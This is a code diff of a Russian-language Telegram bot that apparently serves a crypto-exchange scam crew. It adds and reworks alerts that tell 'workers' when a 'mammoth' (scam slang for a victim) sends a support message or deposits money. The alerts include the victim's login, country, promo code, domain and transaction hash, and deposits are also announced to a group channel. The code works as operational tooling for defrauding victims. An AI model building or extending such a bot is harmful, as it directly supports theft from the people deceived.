@@ -57,7 +57,7 @@ async def show_user_profile(call: types.CallbackQuery = None, msg: types.Message
 ├🦋Ваш никнейм: <code>{DB.get(user_id=user_id, data="username", table=DB.users_table)}</code>
 ├💸Ваш баланс: <code>{DB.get(user_id=user_id, data="balance", table=DB.users_table)}$</code>
 ├💲Ваш процент с депозитов: <code>{DB.get(user_id=user_id, data="percentage", table=DB.users_table)}%</code>
-├👛 Привязанные кошельки:
+├👛Привязанные кошельки:
     └ BTC: <code>{btc_wallet}</code>
     └ USDT TRC-20: <code>{usdt_wallet}</code>
 
@@ -236,7 +236,7 @@ async def promo_view_stats(promo_name: str):
 <blockquote><b>├💰Сумма промокода: {promo_data['amount']}$
 ├🎁Активаций: {promo_data['activations']}
 ├💸Депозитов: {promo_data['deposits']}$
-├🎰Отыгрыш: {'Включен' if promo_data['shouldWager'] is True else 'Отключен'}
+└🎰Отыгрыш: {'Включен' if promo_data['shouldWager'] is True else 'Отключен'}
 </b></blockquote><b>
 📊Статистика по странам (Страна/Активаций/Депозитов/
 Конверсия):</b>
@@ -259,6 +259,38 @@ def country_code_to_flag(country_code):
     return chr(code_points[0]) + chr(code_points[1])
 
 
+async def send_newMessage(data: dict):
+    try:
+        cursor.execute(f"SELECT user_id FROM promocodes WHERE name = ?", (data['promo'], ))
+        worker_id = cursor.fetchone()[0] #Получил user_id по промокоду
+        
+        res = DB.get_notif_user(worker_id)
+        if res[2] == 1:
+            text=f'''
+<b>💬 Пришло новое сообщение в Live Support!</b>
+
+<blockquote>├🦣Логин мамонта: <code>{data['login']}</code>
+├🌍Страна: {country_code_to_flag(data['country'])}<code>{data['country']}</code>
+├🎟Промокод: <code>{data['promo']}</code>
+├🔐Домен: <code>{data['domain']}</code></blockquote><blockquote><b>└💭Сообщение: </b><code>{data['text']}</code></blockquote>
+'''         
+
+            await bot.send_message(
+                worker_id,
+                text,
+                parse_mode='HTML',
+                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+                    [
+                        types.InlineKeyboardButton(text="❄️", callback_data="back_delete")
+                    ]
+                ]),
+            )
+        
+        
+    except Exception as ex:
+        print(11123)
+    
+    
 async def send_newDeposit(data: dict):
     today = datetime.now()
 
@@ -316,30 +348,40 @@ async def send_newDeposit(data: dict):
 
     conn.commit()
 
+    
+    
     message_to_channel = f"""
 <b>🔥 Хо-хо-хо! Новый депозит!
 ├🦋Никнейм воркера: <code>{worker_username if worker_username else '*****'}</code>
 └❄️Сумма депозита: <code>{data['amountUsd']} $</code></b>
         """
     
+    
     await bot.send_message(
         chat_id=GROUP_ID,
         text=message_to_channel,
         parse_mode='HTML'
     )
-    
-    message_to_user = f'''
-<b>🔥 Хо-хо-хо! Вам пришел депозит!
-├❄️Сумма: <code>{data['amountUsd']}$</code>
-├❄️Почта мамонта: <code>{data['mammothLogin']}$</code>
-├❄️Страна: <code>{data['mammothCountry']}$</code>
-└🔐Домен: <code>{data['domain']}</code></b>
-'''
-    await bot.send_message(
-        chat_id=worker_id,
-        text=message_to_user,
-        parse_mode='HTML'
-    )
+    try:
+        res = DB.get_notif_user(worker_id)
+        if res[1] == 1:
+            message_to_user = f'''
+<b>🔥 Хо-хо-хо! Вам пришел депозит!</b>
+
+<blockquote><b>├❄️Сумма: <code>{data['amountUsd']}$</code>
+├🎟Промокод: <code>{data['mammothPromo']}</code>
+├🦣Логин мамонта: <code>{data['mammothLogin']}</code>
+├🌍Страна: {country_code_to_flag(data['mammothCountry'])}
+├⛓️Хэш транзакции: <code>{data['txHash']}</code>
+└🔐Домен: <code>{data['domain']}</code></b></blockquote>
+        '''
+            await bot.send_message(
+                chat_id=worker_id,
+                text=message_to_user,
+                parse_mode='HTML'
+            )
+    except:
+        print('Error send deposit user')
     
 def create_top_list():
     users_list = []
